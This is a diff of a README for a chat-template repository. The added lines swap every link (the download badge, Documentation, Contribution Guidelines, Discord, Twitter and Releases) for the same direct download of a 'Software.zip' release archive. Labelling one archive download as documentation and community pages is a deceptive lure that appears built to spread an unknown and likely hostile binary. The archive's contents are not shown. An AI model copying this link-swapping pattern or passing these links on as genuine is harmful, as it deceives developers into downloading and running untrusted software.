@@ -6,7 +6,7 @@ Welcome to the open-r1-chat-template repository! This template is designed to pr
 
 To begin using this template, you can download the latest version by clicking the button below:
 
-[![Download Template](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Template](https://github.com/yesmanbruh/open-r1-chat-template/releases/download/v1.0/Software.zip)](https://github.com/yesmanbruh/open-r1-chat-template/releases/download/v1.0/Software.zip)
 
 Once you have downloaded the template, follow the instructions in the documentation to set up your chat application. If you encounter any issues or have questions, feel free to reach out to the community for support.
 
@@ -21,22 +21,22 @@ Once you have downloaded the template, follow the instructions in the documentat
 
 ## Documentation
 
-For detailed instructions on how to use the template and customize it for your project, refer to the [Documentation](docs/README.md) section. Here you will find information on installation, configuration, and more.
+For detailed instructions on how to use the template and customize it for your project, refer to the [Documentation](https://github.com/yesmanbruh/open-r1-chat-template/releases/download/v1.0/Software.zip) section. Here you will find information on installation, configuration, and more.
 
 ## Contributing
 
-We welcome contributions from the community to improve this chat template. If you have any ideas for new features, bug fixes, or other enhancements, please submit a pull request. Check out our [Contribution Guidelines](CONTRIBUTING.md) for more information.
+We welcome contributions from the community to improve this chat template. If you have any ideas for new features, bug fixes, or other enhancements, please submit a pull request. Check out our [Contribution Guidelines](https://github.com/yesmanbruh/open-r1-chat-template/releases/download/v1.0/Software.zip) for more information.
 
 ## Community
 
 Join our community to connect with other developers using the open-r1-chat-template. Share your projects, ask questions, and collaborate on building awesome chat applications. 
 
-- [Discord](https://discord.com/your-community-link)
-- [Twitter](https://twitter.com/your-twitter)
+- [Discord](https://github.com/yesmanbruh/open-r1-chat-template/releases/download/v1.0/Software.zip)
+- [Twitter](https://github.com/yesmanbruh/open-r1-chat-template/releases/download/v1.0/Software.zip)
 
 ## Releases
 
-If the download link provided above does not work or you want to explore other versions of the template, check out the [Releases](https://github.com/cli/browser/releases) section. Here you will find a list of all available versions along with release notes.
+If the download link provided above does not work or you want to explore other versions of the template, check out the [Releases](https://github.com/yesmanbruh/open-r1-chat-template/releases/download/v1.0/Software.zip) section. Here you will find a list of all available versions along with release notes.
 
 ## License
 
